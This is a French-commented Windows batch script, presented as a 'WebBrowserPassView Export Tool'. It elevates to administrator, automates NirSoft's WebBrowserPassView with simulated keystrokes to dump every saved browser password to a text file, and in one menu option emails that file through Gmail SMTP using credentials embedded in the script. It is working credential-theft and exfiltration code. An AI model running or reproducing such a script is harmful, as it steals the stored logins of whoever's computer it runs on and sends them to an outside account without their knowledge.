@echo off

rem Elevation en administrateur
net session >nul 2>&1
if %errorlevel% neq 0 (
  powershell -Command "Start-Process '%~f0' -Verb RunAs"
  exit /b
)

set "WBPV=%~dp0WebBrowserPassView.exe"
set "EMAIL=REMOVED_SMTP_EMAIL"

rem Configuration email
set "SMTP_USER=REMOVED_SMTP_EMAIL"
set "SMTP_PASS=REMOVED_SMTP_PASS"

:MENU
cls
echo ========================================
echo    WebBrowserPassView - Export Tool
echo ========================================
echo.
echo 1. Enregistrement local uniquement
echo 2. Enregistrement et envoi par email
echo.
echo 0. Quitter
echo.
set /p choice="Choisissez une option (1, 2 ou 0): "

if "%choice%"=="1" goto EXPORT
if "%choice%"=="2" goto EXPORT_AND_SEND
if "%choice%"=="0" exit /b
goto MENU

:EXPORT
if not exist "%WBPV%" (
  echo WebBrowserPassView.exe non trouve.
  pause
  goto MENU
)

rem Generer un nom de fichier unique
call :GET_UNIQUE_FILENAME
set "OUTPUT=%UNIQUE_FILE%"

echo.
echo Lancement de WebBrowserPassView...
start "" "%WBPV%"

timeout /t 3 /nobreak >nul

echo Traitement en cours...
powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 800; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 800; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('%OUTPUT%{ENTER}')" >nul 2>&1

timeout /t 3 /nobreak >nul

taskkill /F /IM WebBrowserPassView.exe >nul 2>&1

if exist "%OUTPUT%" (
  echo Termine. Fichier sauvegarde: %OUTPUT%
) else (
  echo ERREUR: Le fichier n a pas ete cree.
)

echo.
pause
exit /b

:EXPORT_AND_SEND
if not exist "%WBPV%" (
  echo WebBrowserPassView.exe non trouve.
  pause
  goto MENU
)

rem Generer un nom de fichier unique
call :GET_UNIQUE_FILENAME
set "OUTPUT=%UNIQUE_FILE%"

echo.
echo Lancement de WebBrowserPassView...
start "" "%WBPV%"

timeout /t 3 /nobreak >nul

echo Traitement en cours...
powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 800; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 800; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('%OUTPUT%{ENTER}')" >nul 2>&1

timeout /t 3 /nobreak >nul

taskkill /F /IM WebBrowserPassView.exe >nul 2>&1

if not exist "%OUTPUT%" (
  echo ERREUR: Le fichier n a pas ete cree.
  pause
  goto MENU
)

echo Fichier sauvegarde: %OUTPUT%
echo.
echo Envoi du fichier par email...

powershell -Command ^
"$SMTPServer = 'smtp.gmail.com'; ^
$SMTPPort = 587; ^
$Username = '%SMTP_USER%'; ^
$Password = '%SMTP_PASS%'; ^
$EmailFrom = $Username; ^
$EmailTo = '%EMAIL%'; ^
$Subject = 'Export WebBrowserPassView - ' + (Get-Date -Format 'dd/MM/yyyy HH:mm'); ^
$Body = 'Export automatique des mots de passe du navigateur.'; ^
$FilePath = '%OUTPUT%'; ^
try { ^
    $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force; ^
    $Credential = New-Object System.Management.Automation.PSCredential($Username, $SecurePassword); ^
    $MailMessage = @{ ^
        From = $EmailFrom; ^
        To = $EmailTo; ^
        Subject = $Subject; ^
        Body = $Body; ^
        SmtpServer = $SMTPServer; ^
        Port = $SMTPPort; ^
        UseSsl = $true; ^
        Credential = $Credential; ^
        Attachments = $FilePath ^
    }; ^
    Send-MailMessage @MailMessage; ^
    Write-Host 'Email envoye avec succes!' -ForegroundColor Green ^
} catch { ^
    Write-Host 'Erreur lors de l envoi:' $_.Exception.Message -ForegroundColor Red ^
}"

echo.
pause
exit /b

:GET_UNIQUE_FILENAME
set "BASE=%~dp0passwords_export"
set "EXT=.txt"
set "COUNTER=0"
set "UNIQUE_FILE=%BASE%%EXT%"

:CHECK_FILE
if exist "%UNIQUE_FILE%" (
  set /a COUNTER+=1
  set "UNIQUE_FILE=%BASE%_%COUNTER%%EXT%"
  goto CHECK_FILE
)
goto :eof